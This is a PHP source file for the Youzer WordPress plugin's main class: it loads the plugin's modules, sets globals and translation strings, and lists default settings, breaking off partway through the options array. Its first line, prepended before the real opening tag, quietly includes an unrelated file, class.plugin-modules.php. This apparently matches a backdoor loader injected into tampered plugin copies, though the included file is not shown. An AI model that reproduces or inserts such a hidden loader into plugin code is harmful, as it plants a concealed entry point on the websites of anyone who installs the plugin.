<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

class Youzer {

    protected $plugin_slug;

    public $version;

    public function __construct() {

        // Init Data.
        $this->version = '2.1.0';
        $this->plugin_slug = 'youzer-slug';

        // Load Functions.
        $this->init_youzer();

        // Load Global Variables.
        $this->youzer_globals();

        // Add Plugin Links.
        add_filter(
            'plugin_action_links_' . YOUZER_BASENAME,
            array( $this, 'plugin_action_links' )
        );

        // Add Plugin Links in Multisite..
        add_filter(
            'network_admin_plugin_action_links_' . YOUZER_BASENAME,
            array( $this, 'plugin_action_links' )
        );

    }

    /**
     * # Init Youzer Files
     */
    private function init_youzer() {

        // Youzer General Functions.
        require_once YZ_PUBLIC_CORE . 'functions/yz-general-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/yz-buddypress-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/yz-scripts-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/yz-profile-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/yz-groups-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/yz-user-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/yz-admin-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/yz-xprofile-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/yz-account-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/yz-messages-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/yz-navbar-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/yz-mailchimp-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/yz-mailster-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/yz-account-verification-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/yz-authentication-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/yz-export-functions.php';
        
        if ( yz_is_bpfollowers_active() ) {
            require_once YZ_PUBLIC_CORE . 'functions/yz-buddypress-followers-integration.php';
        }
        
        if ( yz_is_mycred_installed() ) {
            require_once YZ_PUBLIC_CORE . 'mycred/yz-mycred-functions.php';
        }
        
        if ( yz_is_bbpress_installed() ) {
            require_once YZ_PUBLIC_CORE . 'functions/yz-bbpress.php';
        }

        // Wall Functions.
        require_once YZ_PUBLIC_CORE . 'functions/wall/yz-wall-form-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/wall/yz-wall-general-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/wall/yz-wall-profile-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/wall/yz-wall-groups-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/wall/yz-wall-activity-functions.php';

        // Posts Tools.
        require_once YZ_PUBLIC_CORE . 'functions/posts-tools/yz-posts-tools-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/posts-tools/yz-wall-sticky-posts-functions.php';
        
        if ( yz_is_bookmark_active() ) {
            require_once YZ_PUBLIC_CORE . 'functions/posts-tools/yz-bookmarks-functions.php';
        }
        
        // Directory Functions.
        require_once YZ_PUBLIC_CORE . 'functions/directories/yz-members-directory-functions.php';
        require_once YZ_PUBLIC_CORE . 'functions/directories/yz-groups-directory-functions.php';

        // Youzer Classes.
        require_once YZ_PUBLIC_CORE . 'class-yz-header.php';
        require_once YZ_PUBLIC_CORE . 'class-yz-widgets.php';
        require_once YZ_PUBLIC_CORE . 'class-yz-author.php';
        require_once YZ_PUBLIC_CORE . 'class-yz-fields.php';
        require_once YZ_PUBLIC_CORE . 'class-yz-user.php';
        require_once YZ_PUBLIC_CORE . 'class-yz-tabs.php';
        require_once YZ_PUBLIC_CORE . 'class-yz-ajax.php';
        require_once YZ_PUBLIC_CORE . 'class-yz-wall.php';
        require_once YZ_PUBLIC_CORE . 'class-yz-groups.php';
        require_once YZ_PUBLIC_CORE . 'class-yz-styling.php';
        require_once YZ_PUBLIC_CORE . 'class-yz-account-verification.php';

        // Include Youzer Main Pages.
        require_once YZ_PUBLIC_CORE . 'pages/yz-account.php';
        require_once YZ_PUBLIC_CORE . 'pages/yz-profile.php';

        // Youzer Profile Tabs.
        require_once YZ_PUBLIC_CORE . 'tabs/yz-tab-wall.php';
        require_once YZ_PUBLIC_CORE . 'tabs/yz-tab-info.php';
        require_once YZ_PUBLIC_CORE . 'tabs/yz-tab-posts.php';
        require_once YZ_PUBLIC_CORE . 'tabs/yz-custom-tabs.php';
        require_once YZ_PUBLIC_CORE . 'tabs/yz-tab-overview.php';
        require_once YZ_PUBLIC_CORE . 'tabs/yz-tab-comments.php';

        // Youzer Account Settings.
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-ads.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-post.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-link.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-video.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-quote.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-skills.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-flickr.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-groups.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-project.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-friends.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-about-me.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-services.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-slideshow.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-instagram.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-user-tags.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-portfolio.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-basic-infos.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-infos-boxes.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-user-badges.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-user-balance.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-recent-posts.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-custom-infos.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-custom-widgets.php';
        require_once YZ_PUBLIC_CORE . 'widgets/yz-widgets/class-yz-social-networks.php';

        // Wordpress Widgets.
        require_once YZ_PUBLIC_CORE . 'widgets/wp-widgets/class-yz-author-widget.php';
        require_once YZ_PUBLIC_CORE . 'widgets/wp-widgets/class-yz-group-rss-widget.php';
        require_once YZ_PUBLIC_CORE . 'widgets/wp-widgets/class-yz-my-account-widget.php';
        require_once YZ_PUBLIC_CORE . 'widgets/wp-widgets/class-yz-group-mods-widget.php';
        require_once YZ_PUBLIC_CORE . 'widgets/wp-widgets/class-yz-post-author-widget.php';
        require_once YZ_PUBLIC_CORE . 'widgets/wp-widgets/class-yz-group-admins-widget.php';
        require_once YZ_PUBLIC_CORE . 'widgets/wp-widgets/class-yz-smart-author-widget.php';
        require_once YZ_PUBLIC_CORE . 'widgets/wp-widgets/class-yz-activity-rss-widget.php';
        require_once YZ_PUBLIC_CORE . 'widgets/wp-widgets/class-yz-notifications-widget.php';
        require_once YZ_PUBLIC_CORE . 'widgets/wp-widgets/class-yz-group-suggestions-widget.php';
        require_once YZ_PUBLIC_CORE . 'widgets/wp-widgets/class-yz-friend-suggestions-widget.php';
        require_once YZ_PUBLIC_CORE . 'widgets/wp-widgets/class-yz-group-description-widget.php';
        require_once YZ_PUBLIC_CORE . 'widgets/wp-widgets/class-yz-mycred-balance-widget.php';

        // Init Classes
        $this->profile  = new Youzer_Profile();
        $this->group    = new Youzer_Group();
        $this->header   = new Youzer_Header();
        $this->account  = new Youzer_Account();
        $this->fields   = new Youzer_Fields();
        $this->author   = new Youzer_Author();
        $this->user     = new Youzer_User();
        $this->tabs     = new Youzer_Tabs();
        $this->ajax     = new Youzer_Ajax();
        $this->wall     = new Youzer_Wall();
        $this->widgets  = new Youzer_Widgets();
        $this->styling  = new Youzer_Styling();
        $this->account_verification = new Youzer_Account_Verification();

    }

    /**
     * # Youzer Global Variables .
     */
    private function youzer_globals() {

        global $wpdb, $Yz_Translation, $Yz_Settings, $Yz_Widgets, $Yz_default_options, $YZ_upload_url, $YZ_upload_dir, $Logy_users_table, $Yz_bookmark_table;

        // Get Data.
        $Yz_Settings = $this->fields;
        $Yz_Widgets  = $this->widgets;
        $Yz_default_options = $this->standard_options();

        // Get Uploads Directory Path.
        $upload_dir = wp_upload_dir();

        // Get Uploads Directory.
        $YZ_upload_url = apply_filters( 'youzer_upload_url', $upload_dir['baseurl'] . '/youzer/', $upload_dir['baseurl'] );
        $YZ_upload_dir = apply_filters( 'youzer_upload_dir', $upload_dir['basedir'] . '/youzer/', $upload_dir['basedir'] );

        // Translation Data.
        $Yz_Translation = $this->global_localize();

        // Get Table Names.
        $Logy_users_table = $wpdb->prefix . 'logy_users';
        $Yz_bookmark_table = $wpdb->prefix . 'yz_bookmark';
    }

    /**
     * Youzer Text Domain
     */
    function global_localize() {
        
        global $YZ_upload_url;

        // Init Var.
        $localize = array(
            'try_later'             => __( 'Something went wrong, please try again later.', 'youzer' ),
            'reset_error'           => __( 'An Error Occurred While Resetting The Options !!', 'youzer' ),
            'move_wg'               => __( 'This widget can\'t be moved to the other side.', 'youzer' ),
            'empty_network'         => __( 'Network Name Is Empty or Is Already Exist', 'youzer' ),
            'empty_wg'              => __( 'Widget Title Is Empty or Is Already Exist', 'youzer' ),
            'empty_ad'              => __( 'Ad Name Is Empty or Is Already Exist !', 'youzer' ),
            'items_nbr'             => __( 'The Number Of Items Allowed is ', 'youzer' ),
            'reset_dialog_title'    => __( 'Resetting Options Confirmation', 'youzer' ),
            'name_exist'            => __( 'The Name Is Already Exist !', 'youzer' ),
            'no_networks'           => __( 'No social networks Found !', 'youzer' ),
            'no_custom_widgets'     => __( 'No custom widgets Found !', 'youzer' ),
            'required_fields'       => __( 'all fields are required !', 'youzer' ),
            'invalid_url'           => __( 'Please enter a valid URL.', 'youzer' ),
            'utag_name_empty'       => __( 'user tag name is empty!', 'youzer' ),
            'empty_banner'          => __( 'Banner field is empty !', 'youzer' ),
            'banner_url'            => __( 'Banner Url not working.', 'youzer' ),
            'serv_desc_desc'        => __( 'add service description', 'youzer' ),
            'tab_url_empty'         => __( 'Tab LinK Url is Empty!', 'youzer' ),
            'no_custom_tabs'        => __( 'No custom tabs Found !', 'youzer' ),
            'tab_code_empty'        => __( 'Tab Content is Empty!', 'youzer' ),
            'empty_field'           => __( 'Field Name Is Empty !', 'youzer' ),
            'update_user_tag'       => __( 'update user tags type', 'youzer' ),
            'no_user_tags'          => __( 'No user tags Found !', 'youzer' ),
            'serv_desc_icon'        => __( 'select service icon', 'youzer' ),
            'service_desc'          => __( 'service description', 'youzer' ),
            'tab_title_empty'       => __( 'Tab title is empty!', 'youzer' ),
            'empty_options'         => __( 'Options are empty !', 'youzer' ),
            'no_wg'                 => __( 'No widgets Found !', 'youzer' ),
            'serv_desc_title'       => __( 'type service title', 'youzer' ),
            'code_empty'            => __( 'AD Code is Empty!', 'youzer' ),
            'skill_desc_percent'    => __( 'skill bar percent', 'youzer' ),
            'skill_desc_title'      => __( 'type skill title', 'youzer' ),
            'no_items'              => __( 'no items found !', 'youzer' ),
            'skill_desc_color'      => __( 'skill bar color', 'youzer' ),
            'processing'            => __( 'processing... !', 'youzer' ),
            'no_ads'                => __( 'No ads Found !', 'youzer' ),
            'update_network'        => __( 'update network', 'youzer' ),
            'update_widget'         => __( 'update widget', 'youzer' ),
            'service_title'         => __( 'service title', 'youzer' ),
            'update_field'          => __( 'update field', 'youzer' ),
            'service_icon'          => __( 'service icon', 'youzer' ),
            'save_changes'          => __( 'save changes', 'youzer' ),
            'upload_photo'          => __( 'upload photo', 'youzer' ),
            'error_msg'             => __( 'Ops, Error !', 'youzer' ),
            'photo_title'           => __( 'photo title', 'youzer' ),
            'show_wg'               => __( 'Show Widget', 'youzer' ),
            'hide_wg'               => __( 'Hide Widget', 'youzer' ),
            'edit_item'             => __( 'delete item', 'youzer' ),
            'photo_path'            => __( 'photo path', 'youzer' ),
            'update_tab'            => __( 'update tab', 'youzer' ),
            'bar_percent'           => __( 'percent (%)', 'youzer' ),
            'photo_link'            => __( 'photo link', 'youzer' ),
            'success_msg'           => __( "Success !", 'youzer' ),
            'edit_item'             => __( 'edit item', 'youzer' ),
            'update_ad'             => __( 'update ad', 'youzer' ),
            'got_it'                => __( 'got it!', 'youzer' ),
            'bar_title'             => __( 'title', 'youzer' ),
            'bar_color'             => __( 'color', 'youzer' ),
            'done'                  => __( 'save', 'youzer' ),

            // Passing Data.
            'default_img' => YZ_PA . 'images/default-img.png',
            'ajax_url'    => admin_url( 'admin-ajax.php' ),
            'upload_url' => $YZ_upload_url

        );

        return apply_filters( 'yz_global_localize_vars', $localize );

    }

    /**
     * # Youzer Standard Options .
     */
    function standard_options() {

        $default_options = array(

            // Author Box
            'yz_author_photo_effect'        => 'on',
            'yz_display_author_posts'       => 'on',
            'yz_display_author_views'       => 'on',
            'yz_display_author_comments'    => 'on',
            'yz_display_author_networks'    => 'on',
            'yz_enable_author_pattern'      => 'on',
            'yz_enable_author_overlay'      => 'on',
            'yz_enable_author_photo_border' => 'on',
            'yz_author_photo_border_style'  => 'circle',
            'yz_author_sn_bg_type'          => 'silver',
            'yz_author_sn_bg_style'         => 'radius',
            'yz_author_meta_type'           => 'location',
            'yz_author_meta_type'           => 'full_location',
            'yz_author_meta_icon'           => 'map-marker',
            'yz_author_layout'              => 'yzb-author-v1',

            // Author Statistics.
            'yz_author_use_statistics_bg' => 'on',
            'yz_display_widget_networks' => 'on',
            'yz_author_use_statistics_borders' => 'on',

            // User Profile Header  
            'yz_profile_photo_effect'           => 'on',
            'yz_display_header_site'            => 'on',
            'yz_display_header_posts'           => 'on',
            'yz_display_header_views'           => 'on',
            'yz_display_header_comments'        => 'on',
            'yz_display_header_networks'        => 'on',
            'yz_display_header_location'        => 'on',
            'yz_enable_header_pattern'          => 'on',
            'yz_enable_header_overlay'          => 'on',
            'yz_header_enable_user_status'      => 'on',
            'yz_enable_header_photo_border'     => 'on',
            'yz_header_use_photo_as_cover'      => 'off',
            'yz_header_photo_border_style'      => 'circle',
            'yz_header_sn_bg_type'              => 'silver',
            'yz_header_sn_bg_style'             => 'circle',
            'yz_header_layout'                  => 'hdr-v1',
            'yz_header_meta_type'               => 'full_location',
            'yz_header_meta_icon'               => 'map-marker',
            'yz_header_use_statistics_bg'       => 'on',
            'yz_header_use_statistics_borders'  => 'off',

            // Group Header 
            'yz_group_photo_effect'                 => 'on',
            'yz_display_group_header_privacy'       => 'on',
            'yz_display_group_header_posts'         => 'on',
            'yz_display_group_header_members'       => 'on',
            'yz_display_group_header_networks'      => 'on',
            'yz_display_group_header_activity'      => 'on',
            'yz_enable_group_header_pattern'        => 'on',
            'yz_enable_group_header_overlay'        => 'on',
            'yz_enable_group_header_avatar_border'  => 'on',
            'yz_group_header_use_avatar_as_cover'   => 'on',
            'yz_group_header_sn_bg_type'            => 'silver',
            'yz_group_header_sn_bg_style'           => 'circle',
            'yz_group_header_layout'                => 'hdr-v1',
            'yz_group_header_avatar_border_style'   => 'circle',
            'yz_group_header_use_statistics_bg'     => 'on',
            'yz_group_header_use_statistics_borders'=> 'off',

            // WP Navbar
            'yz_disable_wp_menu_avatar_icon' => 'on',

            // Navbar
            'yz_display_navbar_icons' => 'on',
            'yz_profile_navbar_menus_limit' => 5,
            'yz_navbar_icons_style' => 'navbar-inline-icons',
            'yz_vertical_layout_navbar_type' => 'wild-navbar',

            // Posts Tab
            'yz_profile_posts_per_page'  => 5,
            'yz_display_post_meta'       => 'on',
            'yz_display_post_excerpt'    => 'on',
            'yz_display_post_date'       => 'on',
            'yz_display_post_cats'       => 'on',
            'yz_display_post_comments'   => 'on',
            'yz_display_post_readmore'   => 'on',
            'yz_display_posts_tab'       => 'on',
            'yz_display_post_meta_icons' => 'on',
            'yz_posts_tab_icon'          => 'pencil',
            'yz_posts_tab_title'         => __( 'Posts', 'youzer' ),

            // Overview Tab
            'yz_display_overview_tab' => 'on',
            'yz_overview_tab_icon'    => 'globe',
            'yz_bookmarks_tab_icon'    => 'bookmark-o',
            'yz_overview_tab_title'   => __( 'Overview', 'youzer' ),

            // Overview Tab
            'yz_display_wall_tab' => 'on',
            'yz_wall_tab_icon'    => 'address-card-o',
            'yz_wall_tab_title'   => __( 'Wall', 'youzer' ),

            // infos Tab
            'yz_display_infos_tab'  => 'on',
            'yz_info_tab_icon'      => 'info',
            'yz_info_tab_title' => __( 'Info', 'youzer' ),

            // Comments Tab
            'yz_profile_comments_nbr'     => 5,
            'yz_display_comment_date'     => 'on',
            'yz_display_comments_tab'     => 'on',
            'yz_display_view_comment'     => 'on',
            'yz_display_comment_username' => 'on',
            'yz_comments_tab_icon'        => 'comments-o',
            'yz_comments_tab_title'       => __( 'Comments', 'youzer' ),

            // Widgets Settings
            'yz_display_wg_title_icon' => 'on',
            'yz_use_wg_title_icon_bg'  => 'on',
            'yz_wgs_border_style'      => 'radius',

            // Display Widget Titles
            'yz_wg_sn_display_title'        => 'on',
            'yz_wg_link_display_title'      => 'off',
            'yz_wg_quote_display_title'     => 'off',
            'yz_wg_video_display_title'     => 'on',
            'yz_wg_rposts_display_title'    => 'on',
            'yz_wg_skills_display_title'    => 'on',
            'yz_wg_flickr_display_title'    => 'on',
            'yz_wg_about_me_display_title'  => 'on',
            'yz_wg_services_display_title'  => 'on',
            'yz_wg_portfolio_display_title' => 'on',
            'yz_wg_friends_display_title'   => 'on',
            'yz_wg_groups_display_title'    => 'on',
            'yz_wg_instagram_display_title' => 'on',
            'yz_wg_slideshow_display_title' => 'off',
            'yz_wg_user_tags_display_title' => 'off',
            'yz_wg_user_badges_display_title' => 'on',
            'yz_wg_user_balance_display_title' => 'off',

            // Widget Titles
            'yz_wg_post_title'      => __( 'Post', 'youzer' ),
            'yz_wg_link_title'      => __( 'Link', 'youzer' ),
            'yz_wg_video_title'     => __( 'Video', 'youzer' ),
            'yz_wg_quote_title'     => __( 'Quote', 'youzer' ),
            'yz_wg_skills_title'    => __( 'Skills', 'youzer' ),
            'yz_wg_flickr_title'    => __( 'Flickr', 'youzer' ),
            'yz_wg_friends_title'   => __( 'Friends', 'youzer' ),
            'yz_wg_groups_title'    => __( 'Groups', 'youzer' ),
            'yz_wg_project_title'   => __( 'Project', 'youzer' ),
            'yz_wg_aboutme_title'   => __( 'About me', 'youzer' ),
            'yz_wg_services_title'  => __( 'Services', 'youzer' ),
            'yz_wg_portfolio_title' => __( 'Portfolio', 'youzer' ),
            'yz_wg_instagram_title' => __( 'Instagram', 'youzer' ),
            'yz_wg_user_tags_title' => __( 'User Tags', 'youzer' ),
            'yz_wg_slideshow_title' => __( 'Slideshow', 'youzer' ),
            'yz_wg_rposts_title'    => __( 'Recent posts', 'youzer' ),
            'yz_wg_sn_title'        => __( 'Keep in touch', 'youzer' ),
            'yz_wg_user_badges_title'  => __( 'user badges', 'youzer' ),
            'yz_wg_user_balance_title' => __( 'user balance', 'youzer' ),

            // Social Networks
            'yz_wg_sn_bg_style'   => 'radius',
            'yz_wg_sn_bg_type'    => 'colorful',
            'yz_wg_sn_icons_size' => 'full-width',

            // Badges.
            'yz_wg_max_user_badges_items' => 12,

            // Skills
            'yz_wg_max_skills' => 5,

            // About Me
            'yz_wg_aboutme_img_format' => 'circle',

            // Project
            'yz_display_prjct_meta' => 'on',
            'yz_display_prjct_tags' => 'on',
            'yz_display_prjct_meta_icons' => 'on',
            'yz_wg_project_types' => array(
                __( 'featured project', 'youzer' ),
                __( 'recent project', 'youzer' )
            ),

            // Post
            'yz_display_wg_post_meta'       => 'on',
            'yz_display_wg_post_readmore'   => 'on',
            'yz_display_wg_post_tags'       => 'on',
            'yz_display_wg_post_excerpt'    => 'on',
            'yz_display_wg_post_date'       => 'on',
            'yz_display_wg_post_comments'   => 'on',
            'yz_display_wg_post_meta_icons' => 'on',
            'yz_wg_post_types'              => array(
                __( 'featured post', 'youzer' ),
                __( 'recent post', 'youzer' )
            ),

            // Login Page Settings.
            'yz_login_page' => null,
            'yz_login_page_type' => 'url',
            'yz_enable_ajax_login' => 'off',
            'yz_enable_login_popup' => 'off',
            'yz_login_page_url' => wp_login_url(),

            // Services
            'yz_wg_max_services' => 4,
            'yz_display_service_icon' => 'on',
            'yz_display_service_text' => 'on',
            'yz_display_service_title' => 'on',
            'yz_wg_service_icon_bg_format' => 'circle',
            'yz_wg_services_layout' => 'vertical-services-layout',

            // Slideshow
            'yz_wg_max_slideshow_items' => 3,
            'yz_slideshow_height_type' => 'fixed',
            'yz_display_slideshow_title' => 'off',

            // Portfolio
            'yz_wg_max_portfolio_items' => 9,
            'yz_display_portfolio_url'  => 'on',
            'yz_display_portfolio_zoom' => 'on',
            'yz_display_portfolio_title' => 'on',

            // Flickr
            'yz_wg_max_flickr_items' => 6,

            // Friends
            'yz_wg_max_friends_items' => 5,
            'yz_wg_friends_layout' => 'list',
            'yz_wg_friends_avatar_img_format' => 'circle',

            // Groups
            'yz_wg_max_groups_items' => 3,
            'yz_wg_groups_avatar_img_format' => 'circle',

            // Instagram
            'yz_wg_max_instagram_items' => 9,
            'yz_display_instagram_url'  => 'on',
            'yz_display_instagram_zoom' => 'on',
            'yz_display_instagram_title' => 'on',

            // Recent Posts
            'yz_wg_max_rposts' => 3,
            'yz_wg_rposts_img_format' => 'circle',

            // Use Profile Effects
            'yz_use_effects' => 'off',
            'yz_profile_login_button' => 'on',

            // Profile Main Content Available Widgets
            'yz_profile_main_widgets' => array(
                array( 'slideshow'  => 'visible' ),
                array( 'project'    => 'visible' ),
                array( 'skills'     => 'visible' ),
                array( 'portfolio'  => 'visible' ),
                array( 'quote'      => 'visible' ),
                array( 'instagram'  => 'visible' ),
                array( 'services'   => 'visible' ),
                array( 'post'       => 'visible' ),
                array( 'link'       => 'visible' ),
                array( 'video'      => 'visible' ),
            ),

            // Profile Sidebar Available Widgets
            'yz_profile_sidebar_widgets' => array (
                array( 'user_balance'    => 'visible' ),
                array( 'user_badges'     => 'visible' ),
                array( 'about_me'        => 'visible' ),
                array( 'social_networks' => 'visible' ),
                array( 'friends'         => 'visible' ),
                array( 'flickr'          => 'visible' ),
                array( 'groups'          => 'visible' ),
                array( 'recent_posts'    => 'visible' ),
                array( 'user_tags'       => 'visible' ),
                array( 'email'           => 'visible' ),
                array( 'address'         => 'visible' ),
                array( 'website'         => 'visible' ),
                array( 'phone'           => 'visible' ),
            ),

            // Profile 404
            'yz_profile_404_button' => __( 'Go Back Home', 'youzer' ),
            'yz_profile_404_desc'   => __( "we're sorry the profile you're looking for cannot be found.", 'youzer' ),

            // Profil Scheme.
            'yz_profile_scheme' => 'yz-blue-scheme',
            'yz_enable_profile_custom_scheme' => 'off',

            // Panel Options.
            'yz_enable_panel_fixed_save_btn' => 'on',
            'yz_panel_scheme' => 'uk-yellow-scheme',
            'yz_tabs_list_icons_style' => 'yz-tabs-list-gradient',

            // Tabs Settings.
            'yz_display_profile_tabs_count' => 'on',

            // Panel Messages.
            'yz_msgbox_mailchimp' => 'on',
            'yz_msgbox_captcha' => 'on',
            'yz_msgbox_logy_login' => 'on',
            'yz_msgbox_mail_tags' => 'off',
            'yz_msgbox_mail_content' => 'on',
            'yz_msgbox_ads_placement' => 'on',
            'yz_msgbox_profile_schemes' => 'on',
            'yz_msgbox_profile_structure' => 'on',
            'yz_msgbox_instagram_wg_app_setup_steps' => 'on',
            'yz_msgbox_custom_widgets_placement' => 'on',
            'yz_msgbox_user_badges_widget_notice' => 'on',
            'yz_msgbox_user_balance_widget_notice' => 'on',

            // Account Settings
            'yz_enable_account_scroll_button' => 'on',
            'yz_files_max_size' => 3,

            // Wall Settings
            'yz_enable_youzer_activity_filter' => 'on',
            'yz_enable_wall_url_preview' => 'on',
            'yz_enable_wall_posts_reply' => 'on',
            'yz_enable_wall_posts_likes' => 'on',
            'yz_enable_wall_posts_comments' => 'on',
            'yz_enable_wall_posts_deletion' => 'on',
            'yz_enable_activity_directory_filter_bar' => 'on',
            'yz_attachments_max_size' => 10,
            'yz_attachments_max_nbr'  => 200,
            'yz_atts_allowed_images_exts' => array(
                'png', 'jpg', 'jpeg', 'gif'
            ),
            'yz_atts_allowed_videos_exts' => array(
                'mp4', 'ogg', 'ogv', 'webm',
            ),
            'yz_atts_allowed_audios_exts' => array(
                'mp3', 'ogg', 'wav',
            ),
            'yz_atts_allowed_files_exts' => array(
                'png', 'jpg', 'jpeg', 'gif', 'doc', 'docx', 'pdf', 'rar',
                'zip', 'mp4', 'mp3', 'ogg', 'pfi'
            ),

            // Bookmarking Posts.
            'yz_enable_bookmarks' => 'on',
            'yz_enable_bookmarks_privacy' => 'private',

            // Sticky Posts.
            'yz_enable_sticky_posts' => 'on',
            'yz_enable_groups_sticky_posts' => 'on',
            'yz_enable_activity_sticky_posts' => 'on',
            
            // Scroll to top.
            'yz_display_scrolltotop' => 'off',
            'yz_display_group_scrolltotop' => 'off',
            'yz_enable_settings_copyright' => 'on',

            // Wall Posts Per Page
            'yz_activity_wall_posts_per_page' => 20,
            'yz_profile_wall_posts_per_page' => 20,
            'yz_groups_wall_posts_per_page' => 20,
            
            // Wall Settings.
            'yz_enable_wall_file' => 'on',
            'yz_enable_wall_link' => 'on',
            'yz_enable_wall_photo' => 'on',
            'yz_enable_wall_audio' => 'on',
            'yz_enable_wall_video' => 'on',
            'yz_enable_wall_quote' => 'on',
            'yz_enable_wall_status' => 'on',
            'yz_enable_wall_comments' => 'off',
            'yz_enable_wall_new_cover' => 'on',
            'yz_enable_wall_new_member' => 'on',
            'yz_enable_wall_slideshow' => 'on',
            'yz_enable_wall_filter_bar' => 'on',
            'yz_enable_wall_new_avatar' => 'on',
            'yz_enable_wall_joined_group' => 'on',
            'yz_enable_wall_posts_embeds' => 'on',
            'yz_enable_wall_new_blog_post' => 'on',
            'yz_enable_wall_created_group' => 'on',
            'yz_enable_wall_comments_embeds' => 'on',
            'yz_enable_wall_updated_profile' => 'off',
            'yz_enable_wall_new_blog_comment' => 'off',
            'yz_enable_wall_friendship_created' => 'on',
            'yz_enable_wall_friendship_accepted' => 'on',

            // Profile Settings
            'yz_allow_private_profiles' => 'off',

            // Profile Settings
            'yz_disable_bp_registration' => 'off',

            // Members Directory
            'yz_md_users_per_page' => 18,
            'yz_md_card_meta_icon' => 'at',
            'yz_enable_md_cards_cover' => 'on',
            'yz_enable_md_cards_status' => 'on',
            'yz_show_md_cards_online_only' => 'on',
            'yz_enable_md_users_statistics' => 'on',
            'yz_md_card_meta_field' => 'user_login',
            'yz_enable_md_custom_card_meta' => 'off',
            'yz_enable_md_cards_avatar_border' => 'off',
            'yz_enable_md_user_views_statistics' => 'on',
            'yz_enable_md_cards_actions_buttons' => 'on',
            'yz_enable_md_user_posts_statistics' => 'on',
            'yz_enable_md_user_friends_statistics' => 'on',
            'yz_enable_md_user_comments_statistics' => 'on',

            // Groups Directory
            'yz_gd_groups_per_page' => 18,
            'yz_enable_gd_cards_cover' => 'on',
            'yz_show_gd_cards_online_only' => 'on',
            'yz_enable_gd_groups_statistics' => 'on',
            'yz_enable_gd_cards_avatar_border' => 'on',
            'yz_enable_gd_cards_actions_buttons' => 'on',
            'yz_enable_gd_group_posts_statistics' => 'on',
            'yz_enable_gd_group_members_statistics' => 'on',
            'yz_enable_gd_group_activity_statistics' => 'on',

            // Groups Directory - Styling
            'yz_gd_cards_buttons_border_style' => 'oval',
            'yz_gd_cards_avatar_border_style' => 'circle',
            'yz_gd_cards_buttons_layout' => 'block',

            // Members Directory - Styling
            'yz_md_cards_buttons_layout' => 'block',
            'yz_md_cards_buttons_border_style' => 'oval',
            'yz_md_cards_avatar_border_style' => 'circle',

            // Custom Styling.
            'yz_enable_global_custom_styling'   => 'off',
            'yz_enable_profile_custom_styling'  => 'off',
            'yz_enable_account_custom_styling'  => 'off',
            'yz_enable_activity_custom_styling' => 'off',
            'yz_enable_groups_custom_styling'   => 'off',
            'yz_enable_groups_directory_custom_styling'  => 'off',
            'yz_enable_members_directory_custom_styling' => 'off',

            // Emoji Settings.
            'yz_enable_posts_emoji' => 'on',
            'yz_enable_comments_emoji' => 'on',
            'yz_enable_messages_emoji' => 'on',

            // General.
            'yz_buttons_border_style' => 'oval',
            'yz_activate_membership_system' => 'on',

            // Account Verification
            'yz_enable_account_verification' => 'on',

            // Login Form
            'logy_login_form_enable_header'     => 'on',
            'logy_user_after_login_redirect'    => 'home',
            'logy_after_logout_redirect'        => 'login',
            'logy_admin_after_login_redirect'   => 'dashboard',
            'logy_login_form_layout'            => 'logy-field-v1',
            'logy_login_icons_position'         => 'logy-icons-left',
            'logy_login_actions_layout'         => 'logy-actions-v1',
            'logy_login_btn_icons_position'     => 'logy-icons-left',
            'logy_login_btn_format'             => 'logy-border-radius',
            'logy_login_fields_format'          => 'logy-border-flat',
            'logy_login_form_title'             => __( 'Login', 'youzer' ),
            'logy_login_signin_btn_title'       => __( 'Log In', 'youzer' ),
            'logy_login_register_btn_title'     => __( 'Create New Account', 'youzer' ),
            'logy_login_lostpswd_title'         => __( 'Lost password?', 'youzer' ),
